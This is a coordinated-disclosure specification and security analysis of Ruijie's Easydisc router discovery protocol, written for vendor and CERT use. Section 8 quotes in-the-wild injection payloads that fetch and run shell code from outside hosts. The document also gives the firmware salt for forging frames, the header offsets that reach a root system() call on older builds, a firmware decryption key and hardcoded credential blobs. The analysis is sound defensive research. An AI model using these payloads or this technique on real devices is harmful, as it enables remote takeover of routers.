# Easydisc (SON EasyDiscovery) — protocol specification and security analysis

**Handling: not for publication.** This document exists to support
coordinated disclosure to Ruijie PSIRT, and onward to a CNA / CISA
ICS-CERT if they take it. Nothing here should be posted publicly or
shared outside that channel without an explicit decision to do so. See
§10 for what is and is not a vulnerability claim.

The malware family observed exploiting this protocol in the wild is
documented separately, in the private `cve-2021-35394-ecosystem`
repository (`analysis/geico/README.md`). That material is research with
a different audience and is deliberately **not** part of this
repository. This file is the protocol itself: what a vendor or CERT
needs in order to check their own builds.

---

## 1. Scope and provenance

Everything below is derived from vendor firmware, obtained from Ruijie,
plus packet captures of live exploitation attempts against this network.
No device was tested; no traffic was sent to any third party.

| build | product | arch | easydisc pkg |
|---|---|---|---|
| **ReyeeOS 2.430.0.1924** (`EG_3.0(1)B11P430`, target `mediatek/eg1510xs`) | RG-EG1510XS | `aarch64_cortex-a53` | **4.0-0** |
| **ReyeeOS 2.380** | RG-EG105GW(T) | `ramips_24kec` (MIPS32 LE) | **4.0-0** |
| **ReyeeOS 2.388** | RG-EG105GW(T) | `ramips_24kec` (MIPS32 LE) | **4.0-0** |

Fifteen further router images (five product lines, ReyeeOS 2.248–2.430.1,
aarch64 and MIPS) were added later and are enumerated in
`firmware-audit.md` §1/§3.15. The two that matter for this document are
the **split-daemon 2.248 builds** — RG-EG305GH-E (aarch64) and
RG-EG105G-V2 (MIPS) — whose merge sink is `system()` (§8); every other
image runs the unified `easyson.elf` with an `execvp`-style sink.

Binaries, from the 2.430 image:

| file | size | sha256 |
|---|---|---|
| `usr/sbin/easyson.elf` | 427,872 | `cde369a79d30e8027df55c1ecb91e39a9fe2c6e83fce6c567b2a3f1ffbafed95` |
| `usr/sbin/enet_disp.elf` | 35,304 | `8b7cfdefb588b87ae30210bfc4f39c27d68896d509da9185fb19c2bc81e76ea0` |

**Unless a statement names a build, it was derived from 2.430
(aarch64).** Where 2.380/2.388 differ, that is called out. The three
images declare the *same* easydisc package version (4.0-0) and differ in
architecture, so "version" and "product line" are not separable here —
a caveat that matters for §10.

Source filenames and line numbers below are the vendor's own, recovered
from `dbg_printf` arguments compiled into the binary
(`protocol/esw_disc.c`, `protocol/eap_disc.c`, `protocol/protocol.c`).
They should map directly onto Ruijie's tree.

## 2. Transport and listeners

Easydisc is Ruijie Reyee's proprietary self-organising-network discovery
protocol, spoken over **UDP** on two ports. The vendor's own
configuration, **byte-identical across all three images examined**:

```
# /etc/config/easydisc
config easydisc 'easydisc'
    option eapPort   '43561'
    option eapPeriod '20'
    option eswPort   '43562'
    option eswPeriod '20'
    option eswNeighbor '128'
```

| port | role | receiver | dispatcher |
|---|---|---|---|
| **43561** | `eap` | `son_eap_disc_recv` (`FUN_00413e98`) | `FUN_00412d98`, `protocol/eap_disc.c` — full type switch (§5) |
| **43562** | `esw` | `son_esw_disc_recv` (`FUN_00414968`) | `esw_disc_msg_handler`, `protocol/esw_disc.c` — accepts **only** `0x40` |

Both receivers set their thread name via `prctl(PR_SET_NAME)`, which is
how each was identified positively rather than by inference. Both push
into the **same** event queue (`FUN_00415cd0`), so the two listeners
share downstream processing but not their dispatchers.

## 3. Frame format

```
offset  size   field
0x00    16     MD5(SALT || body)
0x10    n      body  (n = recv_len - 16)
```

Maximum datagram accepted is **0x5dc (1500) bytes**.

The 16-byte prefix is an integrity check, **not** a nonce, device ID or
session token. `utils_get_md5()` in `libeasyson_utils.so` prepends a
32-byte constant before hashing:

```
SALT = "03251584460325158446032515844600"      (32 ASCII bytes)
```

so the prefix is `MD5(SALT ‖ body)`. It is a **fixed, firmware-embedded
value** — not per-device, not per-session, not derived from any
credential. Any party in possession of the firmware can compute a valid
prefix for arbitrary content. This is the protocol's only
authentication-shaped mechanism, and it authenticates nothing.

Receive path, identical in structure on both ports:

```
recvfrom(fd, buf, 0x5dc)
  recv_len < 0x10        -> drop, "Msg's length is wrong"
                            esw_disc.c:110   eap_disc.c:1477
  utils_check_md5(buf)   -> drop, "Msg's md5 is illegality"
                            esw_disc.c:116   eap_disc.c:1483
  body = buf + 0x10, len = recv_len - 0x10
  -> event queue (FUN_00415cd0)
```

The eap path allocates `len - 0xf` and NUL-terminates; the esw path
allocates `len - 0x10`.

## 4. The 460-byte header

The body begins with a fixed **460-byte (`0x1cc`) header**. Both
dispatchers `memcpy` at most `0x1cc` bytes into a zeroed local struct;
**any bytes beyond 460 are passed onward separately as a
variable-length payload**, which is how the command-carrying types
(§6) deliver their arguments.

Because the copy is length-capped into a zeroed buffer, an oversized
datagram causes **no memory corruption**. This is worth stating plainly:
the in-the-wild exploit (§8) is often mistaken for a buffer overflow and
is not one.

Field map. Offsets are relative to the start of the header. Sizes are
the `snprintf` widths the esw hello handler uses when copying each field
out, which independently corroborate the names taken from the validator
(§7) — the two agree everywhere they overlap.

The two **guarded** columns describe **2.430 (RG-EG1510XS) only.** In
2.380 and 2.388 (RG-EG105GW(T)) no field is guarded on either path —
see §7 and §8.

| offset | size | field | guarded (esw, 2.430) | guarded (eap, 2.430) |
|---|---|---|---|---|
| `+0x000` | 4 | **`msg_type`** (`ntohl`) | — | — |
| `+0x004` | 4 | `mid` — message id, used for duplicate suppression (`ntohl`) | — | — |
| `+0x008` | 4 | (`ntohl`) | — | — |
| `+0x00c` | 4 | (`ntohl`) | — | — |
| `+0x020` | 16 | `ip` — validated by `son_check_ipv4` | — | — |
| `+0x048` | 18 | `mac` — `xx:xx:xx:xx:xx:xx` + NUL | ✓ | ✓ |
| `+0x068` | 16 | `sn` — serial number; also the dedup key | ✓ | ✓ |
| `+0x078` | 64 | (string) | — | — |
| `+0x0b8` | 64 | `networkName` | ✓ | ✓ |
| `+0x0f8` | 64 | `groupName` | ✓ | ✓ |
| `+0x138` | 17 | `groupId` | ✓ | ✓ |
| `+0x149` | — | `priority` | — | ✓ |
| `+0x150` | **33** | **`networkId`** — 32 chars + NUL | ✓ | ✓ |
| `+0x171` | — | `reserve1` — compared against the literal `"l3"` (§8) | — | — |
| `+0x177` | 1 | flags; bit 0 and bit 1 both read | — | — |
| `+0x188` | 10 | `product` | ✓ | ✓ |
| `+0x192` | 24 | `hostName` | ✓ | — |
| `+0x1b8` | — | `imac` | — | ✓ |

Note the validators are invoked with a pointer to *header+8*, so their
internal offsets read 8 lower than the table above (`+0x148` for
`networkId`). The values here are header-relative throughout.

## 5. Message types

Recovered from the eap dispatcher's switch (`FUN_00412d98`). **15
accepted values across 12 distinct handlers**; anything else is dropped
with *"resv unknown msg type"* at `eap_disc.c:1175`.

| `msg_type` | handler name | aarch64 addr | notes |
|---|---|---|---|
| `0x10` | `eap_disc_handle_declare_msg` | `FUN_004127a0` | also reached by `0x1010` |
| `0x11` | `eap_disc_handle_reject_msg` | `FUN_004126b4` | |
| `0x12` | `eap_disc_handle_join_msg` | `FUN_00411e40` | also reached by `0x1012` |
| `0x20` | `eap_disc_handle_conflict_msg` | `FUN_00411d98` | |
| `0x30` | `eap_disc_handle_merge_msg` | `FUN_00411a84` | |
| **`0x40`** | `eap_disc_handle_hello_msg` | `FUN_0041198c` | **HELLO** — logs *"Receive hello msg from %s"* |
| `0x50`, `0x51` | `eap_disc_handle_setip_msg` | `FUN_00412ac4` | receives the trailing variable payload |
| **`0x61`** | `sh_handle_sh` | `FUN_004165f8` | **`DISC_MSG_TPYE_SH`** — carries a command (§6) |
| **`0x62`** | `sh_handle_sh_rsp` | `FUN_00416864` | **`DISC_MSG_TPYE_SH_RSP`** — the response form |
| `0x65` | `eap_disc_handle_option_msg` | `FUN_00412cac` | |
| `0x66` | `eap_disc_handle_option_rsp_msg` | `FUN_00412d24` | receives the trailing payload |
| `0x70` | `eap_disc_handle_sync_pwd_msg` | `FUN_00412c08` | receives the trailing payload only |
| `0x1010` | → `0x10` | | alias |
| `0x1012` | → `0x12` | | alias |

**On the naming — resolved, 2026-09-20.** The name↔value mapping in
the table above is now **fully recovered** and no longer inferred. The
2.380/2.388 MIPS builds are *not* stripped: they retain a complete
`.dynsym` with 769 named functions, including `eap_msg_handle` and every
`eap_disc_handle_*_msg`. In those builds the dispatcher's switch calls
its handlers through local GOT slots at `0x4b3984`–`0x4b39b0`, and
reading the pointer stored in each slot names the handler for each case
directly:

```
0x70   -> eap_disc_handle_sync_pwd_msg      0x0041ee2c
0x10   -> eap_disc_handle_declare_msg       0x0041e6c8   (also 0x1010)
0x11   -> eap_disc_handle_reject_msg        0x0041e518
0x12   -> eap_disc_handle_join_msg          0x0041d700   (also 0x1012)
0x20   -> eap_disc_handle_conflict_msg      0x0041d5e8
0x30   -> eap_disc_handle_merge_msg         0x0041d090
0x40   -> eap_disc_handle_hello_msg         0x0041ced4
0x50/1 -> eap_disc_handle_setip_msg         0x0041ec18
0x61   -> sh_handle_sh                      0x004250c4
0x62   -> sh_handle_sh_rsp                  0x0042553c
0x65   -> eap_disc_handle_option_msg        0x0041ef5c
0x66   -> eap_disc_handle_option_rsp_msg    0x0041f024
```

The table is **byte-identical in 2.380 and 2.388**. The three edges that
were previously anchored independently — `0x40` = hello, `0x61` = SH,
`0x62` = SH\_RSP, each from its own log string — all agree with the
recovered table, which is the check that the method is sound. Note the
`0x61`/`0x62` handlers are named `sh_handle_sh` / `sh_handle_sh_rsp` and
live in `protocol/protocol.c`, not in the `eap_disc_*` family; that is
why there were ten `eap_disc_handle_*` names for twelve handlers.

The aarch64 addresses in the table are carried over by matching each
handler's position in the 2.430 dispatcher's switch, which has the same
case structure. **[proven for MIPS, [inferred] for the aarch64 column.]**

`esw` (43562) accepts only `0x40`, per the receive-path analysis
recorded in `cve-2021-35394-ecosystem`, `analysis/geico/README.md`
§2.5 — and reproduced independently in §3 above.

## 6. Type `0x61` — the command-carrying message

This is the protocol's designed-in remote-command surface, and it is the
part a vendor should look at first.

`FUN_004165f8` (`protocol/protocol.c`) handles it:

```
body (past the 460-byte header) is parsed as JSON:
    "cmd"   string   -> strdup                 (fail: protocol.c:0x14e)
    "mid"   int                                (fail: protocol.c:0x154)
    "sync"  bool     (defaults to 1 if absent)
sender identity strdup'd; 32 bytes of address context copied in
    -> enet_event_push(...)                    (fail: protocol.c:0x162)
```

logged verbatim as `DISC_MSG_TPYE_SH, cmd:%s`.

The handler itself **does not execute anything**. It marshals the
command onto a queue consumed by a separate daemon, `enet_disp.elf`,
which carries the matching `cmd:%s` and `exec mqlink_cmd:%s` strings and
has no socket of its own. So the execution surface is: *JSON over UDP →
queue → second process*. Characterising `0x61` as "a message type that
runs a shell command" is close but imprecise; the accurate statement is
that it is a command-transport type whose consumer is out of process.

One guard exists: the handler compares the message's `sn` field against
a stored 16-byte value and returns early on a match.

**The security-relevant question for the vendor is what authorises a
`0x61` message.** Reaching this handler requires only a well-formed
frame with a correct salted-MD5 prefix (§3) — a check computable by
anyone holding the firmware — and `msg_type = 0x61` on UDP/43561. No
credential is consulted on the path described above.

## 7. Input validation

`param_safety_check`, exported by `liblib_c.so`, walks a string and
rejects it if it contains any of **ten** characters:

```
&    |    ;    $    <    >    '    `    CR    LF
```

logged inside the library as `str has inject characters: '%c'`.

Each dispatcher wraps it in a per-field checker
(`FUN_0041504c` for esw, `FUN_00411138` for eap) which logs
*"message (%s) safety check failed on field '%s'"* at `esw_disc.c:0xfa`,
and applies it field by field — the ✓ columns in §4. A single failing
field drops the entire message before the type switch runs:

- esw: *"esw hello msg param safety check failed, drop it"*
- eap: *"eap message param safety check failed, drop it"* (`eap_disc.c:0x43c`)

The character set is a **blocklist of shell metacharacters**, which
tells you what the fields were historically interpolated into. It is
present and called on both ports in 2.430.

**In 2.380 and 2.388 it is not called on either discovery path.**
*(Established 2026-09-20.)* `liblib_c.so` is byte-identical between
those two builds and exports `param_safety_check` in both, so the
validator is available — `easyson.elf` simply never calls it from the
eap or esw dispatchers. The ✓ columns in §4 therefore describe **2.430
only**; for the EG105GW builds every cell in both columns is empty.
Derivation and method in §8. **[proven]**

## 8. Observed exploitation

A malware family tracked here as *geico* has been sending crafted
Easydisc datagrams to UDP/43562 since **2026-08-13**, from
`45.135.194.35`, `204.76.203.21`, `45.135.193.159` and `45.138.16.34`.
388 bytes, laid out as:

```
[16B salted MD5][4B msg_type = 0x40][332B pwntools cyclic()][35B trailer][NUL]
```

Three properties make this worth a vendor's attention regardless of
whether it currently succeeds:

**The MD5 prefix validates.** Both observed variants pass
`utils_check_md5` byte-exactly, so **the operator holds the firmware
salt**. Within a variant the prefix is constant across source IPs and
across days, consistent with a deterministic checksum over fixed
content.

**The filler is a ruler, not an overflow.** `16 + 4 + 332 = 352`, so the
trailer begins at header offset **`0x150` — exactly `networkId`**.
`cyclic()` is the pwntools helper used to *find* an offset during
development; its survival in the shipped payload indicates the offset
was derived experimentally against a real target.

**The trailer is fitted to the struct to the byte.** Both variants are
**exactly 35 bytes**:

| variant | command (chars) | suffix | total |
|---|---|---|---|
| `nc` | `'&nc 160.119.71.134 5959\|sh&'` (29) | `ppppl3` (6) | 35 |
| `g6.wtf` | `'&wget http://g6.wtf/ge -O-\|sh&'` (32) | `al3` (3) | 35 |

`networkId` is copied out with `snprintf(dst, 0x21, ...)` — 32
characters. The `g6.wtf` command is *exactly* 32, surviving the cap
intact. And in **both** variants, padding to a common 35-byte total
places the literal `l3` at header offset **`+0x171`**, which is
`reserve1` — a field the esw hello handler compares against the literal
`"l3"`. Two different command lengths padded to the same total, landing
the same two bytes on the same field, is not coincidence.

`reserve1 == "l3"` is **one of several** conditions that set the
auto-merge flag in `FUN_004151fc`; it also requires the device to be in
a qualifying mode (`FUN_0042a2b4`: mode ∈ {3,4,5,100}), the message's
`networkId` to differ from the device's own, two global flags, and a
per-neighbour merge counter below 2. It steers the message toward the
merge path rather than triggering it alone.

**On 2.430 the packet does not work.** It is rejected at §7 — the
payload begins with `'`, the first character of the blocklist — and
dropped before the type switch. A second barrier sits behind that: the
merge consumer `FUN_004147fc` hands its result to `son_utils_safe_exec`,
which is `pipe`/`fork`/`dup2`/**`execvp(argv[0], argv)`** — argv-style,
no shell, nothing for a quote break-out to break out of.

**On 2.380 / 2.388 the first barrier is absent.** *(Established
2026-09-20.)* The validator gate described above is a property of the
2.430 build only. In both MIPS builds — RG-EG105GW(T), ReyeeOS 2.380 and
2.388 — `param_safety_check` is imported and called, but **never from
the discovery code**. Exhaustively, across the whole executable segment:

| build | `param_safety_check` call sites | on the eap/esw disc path? |
|---|---|---|
| 2.430 aarch64 (RG-EG1510XS) | 16, in 12 functions | **yes** — `FUN_004151fc` (esw hello) → `FUN_004150bc` → `FUN_0041504c` → `param_safety_check`; and `FUN_00411138` on the eap side |
| 2.380 MIPS (RG-EG105GW(T)) | 11, in 7 functions | **no** |
| 2.388 MIPS (RG-EG105GW(T)) | 11, in 7 functions | **no** |

In the MIPS builds the 11 sites are in `group_reload_uf_cb`,
`network_set_networkid_uf_cb`, `network_device_move_uf_cb`,
`enetCap_set_cb`, `enetCap_del_cb`, `enetCap_get_cb` and five sites in
static functions in the master / neighbor / enet\_network regions. **Not
one falls inside the discovery code** (`0x41b728`–`0x4273e0`).
Enumerating callees directly confirms it: `esw_disc_msg_handler`,
`esw_disc_handle_hello_msg`, `eap_msg_handle` and
`eap_disc_handle_hello_msg` call neither `param_safety_check` nor
`utils_param_safe_check` — `esw_disc_handle_hello_msg`'s only
input-inspecting callees are `son_check_ipv4`, `strcmp`, `strncmp` and
`strlen`. **[proven]**

The consequence is direct: **the single check that rejects geico's
packet on 2.430 — the leading `'` hitting the blocklist — does not exist
on the esw hello path in either EG105GW build.** The packet is not
dropped there.

This does *not* by itself make those builds exploitable, and no such
claim is made: the second barrier (§8, below) is a separate question that
was not settled in this pass, and no device was tested. What it does
establish is that the validation coverage **differs between shipping
Reyee builds**, which was previously listed as untested in §10 — and that
geico's packet was plausibly developed against something in the
EG105GW family rather than against a hypothetical older build.

**One caveat, stated because it bounds the claim.** These three images
are 2.430/aarch64/EG1510XS versus 2.380 and 2.388/MIPS/EG105GW, so
**version, architecture and product line still vary together**. The
correct reading is "absent in both EG105GW builds examined, present in
the EG1510XS build examined" — *not* "removed in older firmware" and
*not* "a MIPS-specific defect". Separating those requires an image this
analysis does not have: an EG105GW at 2.430, or an EG1510XS at 2.380.

So this is an **n-day against unpatched or differently-configured
devices, not a 0-day against current firmware.** It is reported here
because the payload's precision — the salt, the `0x150` alignment, the
32-character fit, the `reserve1` padding — is very hard to explain
unless it was developed against a build where it *did* work.

**And a fourth image makes that build concrete.** *(Added 2026-10-27.)*
The RG-EG305GH-E at ReyeeOS 2.248 (`firmware-audit.md` §3.14) is a build
on which **both** barriers above are absent and every property geico's
payload is fitted to is present. Traced statically in `easydisc.elf`
(aarch64) of that image:

- **The salt is byte-identical** — `03251584460325158446032515844600`,
  embedded at `easydisc.elf:0x422110` — so geico's MD5 prefix (§3)
  validates here exactly as it does on the others. **[proven]**
- **The §7 blocklist barrier does not exist on this build at all.**
  `param_safety_check` lives in `liblib_c.so`; the 2.248 discovery daemon
  is a separate binary that links `libeasydisc.so` and **not**
  `liblib_c.so`, and neither `param_safety_check` nor
  `utils_param_safe_check` appears anywhere in it. The leading `'` that
  gets geico's packet dropped on 2.430 hits nothing here. **[proven]**
- **The `reserve1 == "l3"` gate is present and is a literal compare.**
  The merge-decision function `FUN_0040f548` gates the auto-merge on the
  device mode (`cmp #4` / `cmp #5` on the role global at `0x434fc8`), on
  the message `networkId` differing from the device's own
  (`strncmp` against `"0"` at `0x421140` and against self-networkId),
  and on `strncmp(reserve1, "l3", …)` — the literal `"l3"` at
  `0x421168`, read from `msg.discInfo.reserve1` and logged as
  `msg.discInfo.reserve1: %s`. If the resulting flag is set it logs
  `Auto merge ESW[%s] to %s` and calls the merge sink. **[proven]**
- **The §8 second barrier is gone too: the sink is `system()`, not
  `execvp`.** The merge sink `FUN_0040f174` is
  `snprintf(buf, 0x100, "dev_sta set -m esw_networkId_merge '{\"password\":\"admin\", \"type\":\"noenc\",\"force\":\"true\",\"fromSn\":[\"%s\"],\"fromNetworkId\":\"%s\",\"toNetworkId\":\"%s\"}' -b 1", …)` followed by a bare **`system(buf)`** (PLT-resolved). The three `%s`
  sit inside single quotes; `fromSn` and `fromNetworkId` are taken from
  the received message struct (`fromNetworkId` is the very field the
  `differs-from-own` check reads), `toNetworkId` is the device's own.
  So a `'` in the message `networkId` — geico's `0x150` field — closes
  the quote in a command run as root. The merge password is the literal
  `admin` (`type:noenc`), not the `U2FsdGVkX18…` blob of §9. **[proven]**

**What is proven and what is not.** Proven: the salt, the absence of any
validator on this daemon's discovery path, the `"l3"` literal gate, and
that the sink is `system()` with message-derived fields inside single
quotes. **Not traced to the byte:** that the wire-offset `0x150`
`networkId` lands specifically in the struct slot used as
`fromNetworkId` (inferred from the `differs-from-own-networkId` compare
on that slot, strong but not followed through the recv/parse `memcpy`),
the full set of merge preconditions (mode, the two global flags and the
per-neighbour counter of §8 — mode and `reserve1` are confirmed, the
rest not enumerated on this build), and the `snprintf(…, 0x100, …)`
truncation margin (geico's `networkId` command is ≤32 chars, so it fits,
but this was reasoned not fuzzed). **No device was tested.** The honest
statement is that 2.248 is a shipping build on which geico's datagram is
**not** stopped by either barrier that stops it on 2.430, and on which
its `reserve1`/`networkId` layout lines up with a root `system()` — i.e.
this is the kind of build the payload was developed against, established
statically and short of execution.

**And the second barrier, left open above, is now observed on a MIPS
build.** *(Added 2026-10-27.)* A third product line — RG-EG210G-P-V3,
MIPS, at 2.388/2.410/2.430 — was added to the set (`firmware-audit.md`
§3.15). On its 2.430 build the esw hello path has **no**
`param_safety_check` (confirmed in Ghidra: `esw_disc_handle_hello_msg`
validates only with `son_check_ipv4`/`strcmp`/`strncmp`/`strlen`, and a
GOT scan puts every validator site off the discovery path, exactly as on
EG105GW) — so barrier one is absent, as on all MIPS builds. **But its
merge builder calls `son_utils_safe_exec`** (argv/`execvp`), not
`system()`, so barrier two *is* present and geico's quote-breakout has no
shell to land in. This settles the question §8 left open for the MIPS
line in the direction of "not exploitable at the sink" **for the unified
`easyson.elf` builds**: the metacharacter blocklist is not the
load-bearing control; the `execvp`-style sink is.

**The 2.248 `system()` sink is now proven on MIPS, on a second product
line.** *(Added 2026-10-28.)* The sink being `system()` is not unique to
the aarch64 EG305GH. The low-cost **RG-EG105G-V2** at ReyeeOS 2.248.0.2212
(MIPS) ships the same split `easydisc.elf` + `mqtt.elf` with no
`param_safety_check` and no `son_utils_safe_exec`, and its merge builder
decompiles cleanly:

```c
undefined4 FUN_00417da8(a, b, c) {               // easydisc.elf, md5 30771304…
  char buf[256];
  memset(buf, 0, 0x100);
  snprintf(buf, 0x100,
      "dev_sta set -m esw_networkId_merge '{\"password\":\"admin\", "
      "\"type\":\"noenc\",\"force\":\"true\",\"fromSn\":[\"%s\"],"
      "\"fromNetworkId\":\"%s\",\"toNetworkId\":\"%s\"…", a, b, c);
  system(buf);                                   // PTR_system_0044a008 — bare system()
  …
}
```

Three message-derived `%s` interpolated into a single-quoted shell string
and passed straight to `system()` — byte-for-byte the construction traced
on EG305GH 2.248 (`FUN_0040f174`), now on a second architecture. **[proven]**
So "2.248" is a *posture* — the both-barriers-down split-daemon era —
reproduced across at least two product lines, and on EG105G-V2 it is
remediated at **2.280** (2.280/2.300/2.340 revert to the unified
`easyson.elf` with both barriers restored). Because the EG105G-V2 is a
low-cost, readily-obtainable device, it is the practical platform on which
this datagram could be verified against hardware. Full matrix in
`firmware-audit.md` §3.15.

## 9. Hardcoded credentials in the merge path

`FUN_004147fc` (`esw_disc.c:0x4f`) builds the auto-merge request and
passes it to `son_utils_safe_exec` as
`dev_sta set -m esw_networkId_merge '<json>'`:

```json
{"password":"<embedded>", "type":"enc","fromSn":["%s"],
 "fromNetworkId":"%s","toNetworkId":"%s"}
```

with a `"force":"true"` variant on the other branch. The password is a
**literal embedded in the binary**, present in both branches. These are
OpenSSL `Salted__` base64 blobs (`U2FsdGVkX1...`):

| build | value |
|---|---|
| 2.430 (merge path) | `U2FsdGVkX18yODMzMjM5Offgi6OTL+KYXY1eByqCJnI=` |
| 2.430 (also present) | `U2FsdGVkX181MjM0NDUwNDu5BFRGOi81x9t2Ja1Lbf4=` |
| 2.430 (also present) | `U2FsdGVkX182MzcyNTI5Nl9n5bGc6xMYZ/QfiDgl/Cc=` |
| 2.380 / 2.388 | `U2FsdGVkX18POF0/cM8IwywAcZUK8zQngpUv7C2zKng=` |

They are not decrypted here and their scope is not established — that
is the vendor's to assess. Two observations are offered: the value
**differs between product lines**, so it is not one universal constant;
and it is used as the authorisation for a network-merge operation that
an unauthenticated network peer can influence the inputs to.

> **Extended, 2026-09-20.** The embedded value is not a defensive
> fallback but the **operative credential on a fresh device**:
> `FUN_00433ac0` reads `/etc/sd_config/admin` and falls back to the
> literal on failure, and that file **is not present in any of the three
> images**. See [`firmware-audit.md`](firmware-audit.md)
> §3.7 — and §3.1–3.4 of the same document for the broader finding this
> sits inside: the SON MQTT broker's private key, PSK and account
> credentials are all shipped in firmware and **byte-identical across
> both product lines and all three versions**, with an ACL granting every
> authenticated principal every topic. That is a materially larger
> exposure than anything in this protocol.

## 10. Assessment

What is **established**:

1. Easydisc accepts unauthenticated UDP on 43561/43562. Its only
   integrity mechanism is an MD5 over a **firmware-embedded constant
   salt**, computable by anyone with the image.
2. The protocol includes a **designed-in command-transport message
   type** (`0x61`) whose consumer is a separate daemon with `exec`
   strings.
3. Message fields are guarded by a **shell-metacharacter blocklist**,
   whose existence implies the fields have been shell-interpolated at
   some point in this code's history.
4. A **hardcoded credential** authorises the auto-merge operation.
5. An active malware family has been sending **precisely fitted**
   exploit packets at this surface since 2026-08-13, and those packets
   demonstrate possession of the firmware salt and byte-level knowledge
   of the header layout.

What is **not** established, and is not claimed:

- **That any shipping build is exploitable.** On 2.430 the observed
  packet is rejected twice over. No vulnerable build has been
  identified.
- ~~**Which builds, if any, lack the validation.**~~ **Resolved
  2026-09-20 — see §8.** Both EG105GW builds (2.380, 2.388) call
  `param_safety_check` 11 times, none of them on the eap or esw
  discovery path; the EG1510XS build (2.430) calls it 16 times including
  both disc dispatchers. The first barrier against geico's packet is
  therefore absent on the EG105GW builds. What remains *not* established
  is whether that makes them exploitable — the second barrier was not
  settled, and no device was tested.
- **That this maps to a known CVE.** It matches no published Ruijie
  advisory we can find — CVE-2021-43162/43163 (HTTP/luci),
  CVE-2023-7330 (upload), CVE-2024-47146 (MQTT), CVE-2025-34057
  (info-disclosure), Team82's "Open Sesame" (cloud/MITM) are all
  different surfaces. **"No CVE found" is not "no CVE exists"**, and it
  is entirely possible this was reported privately and fixed without an
  advisory. Establishing that is a reason to contact the vendor, not a
  claim to make about them.

Suggested questions for the vendor, in priority order:

1. The esw hello path calls `param_safety_check` on `networkId` in
   2.430 (RG-EG1510XS) but **not** in 2.380 or 2.388 (RG-EG105GW(T)) —
   see §8. Which is intended? Specifically: is the check a fix added
   after 2.388, or is the EG105GW line built from a branch that never
   had it? An EG105GW image at 2.430, or an EG1510XS image at 2.380,
   would settle it immediately and we do not have either.
2. What authorises a `0x61` / `DISC_MSG_TPYE_SH` message, end to end,
   from datagram to `enet_disp.elf` execution?
3. What is the scope of the embedded `esw_networkId_merge` password —
   per-model, per-firmware, or wider?
4. Is the salted-MD5 prefix intended as an integrity check only, or was
   it ever relied on as authentication?

## 11. Reproduction notes

- Firmware decryption (images ship encrypted): strip line 1
  (`upgrade_crypt_v2!@2023`), base64-decode, then OpenSSL `Salted__` +
  8-byte salt, `EVP_BytesToKey(FW_KEY, salt, keylen=32, ivlen=16)` with
  MD5 iterated **2023×**, AES-256-CBC, where
  `FW_KEY = BR0khBR0khsHi4MkNGrJ421Yf&j8ceh6`. Method and constant are
  public (`github.com/gnacho/reyee-nbs3200-root`).
- Both receivers were identified by `prctl(PR_SET_NAME)` rather than by
  log strings, which is the more reliable anchor in stripped builds.
- Ghidra's aarch64 import does not create `adrp+add` constant
  references; decoding those pairs out of `.text` directly recovers
  them. Ghidra string xrefs *do* resolve in the aarch64 build and were
  used throughout.
- **Corrected 2026-09-20 — the MIPS builds are not stripped.** Earlier
  notes in this file described them as "stripped MIPS o32". They are
  not: `easyson_2380.elf` and `easyson_2388.elf` carry a `.dynsym` of
  587 entries, **549 of them named functions with addresses**, including
  `eap_msg_handle`,
  `esw_disc_handle_hello_msg` and every `eap_disc_handle_*_msg`. Their
  *section headers* are stripped, which is why `readelf -s` and
  section-based tooling come up empty — parse `PT_DYNAMIC` instead and
  the names are all there. This is what made §5 and §8 resolvable.
- **`instructions_scanned: 0` from Ghidra's instruction search on those
  programs is a tool bug, not missing disassembly.** The programs *are*
  analysed and `decompile_function` returns correct C for them. Do not
  conclude "not disassembled" from that counter, and do not re-run
  analysis on its account.
- **The `lw $t9,off($gp)` / `jalr $t9` test named in earlier versions of
  §10 is itself a false-negative generator — do not use it.** These
  builds are compiled without optimisation, and the call idiom is:

  ```
  lw    v0, -30704(gp)      # GOT slot for the callee
  nop
  addu  t9, v0, zero        # *then* move into t9
  jalr  ra, t9
  ```

  The GOT slot is loaded into `$v0`, not `$t9`. Across `easyson_2380.elf`
  there are **7,567 `jalr $t9` but only 218 `lw $t9,off($gp)`** — the
  suggested test would have missed roughly 97% of all calls and returned
  a confident, wrong "not called". The sound test is to scan for
  `lw <any reg>, off($gp)` and resolve `$gp + off` against the GOT.
- **Resolving the GOT, concretely.** From `PT_DYNAMIC`:
  `DT_PLTGOT = 0x4b37b0`, `DT_MIPS_LOCAL_GOTNO = 0x177`,
  `DT_MIPS_GOTSYM = 0x172`, so `$gp = DT_PLTGOT + 0x7ff0 = 0x4bb7a0`
  (confirmed against the `lui gp / addiu gp / addu gp,gp,t9` prologue,
  which computes exactly that). External GOT slots begin at
  `DT_PLTGOT + LOCAL_GOTNO*4 = 0x4b3d8c`; slot *i* ≥ `LOCAL_GOTNO`
  corresponds to `dynsym[GOTSYM + (i - LOCAL_GOTNO)]`. Slots *below*
  that boundary are local entries holding internal addresses — which is
  how the §5 handler table was read. Both MIPS builds share the same
  `$gp` and the same slot addresses.
- Sanity-check any such scan against a symbol whose call count you can
  predict. `snprintf` resolves to 385 sites in 75 functions, 13 of them
  in `esw_disc_handle_hello_msg` — which matches that function's
  decompilation exactly. A scan that returns zero for `snprintf` is
  broken, which is precisely how the bad `$t9` test was caught.
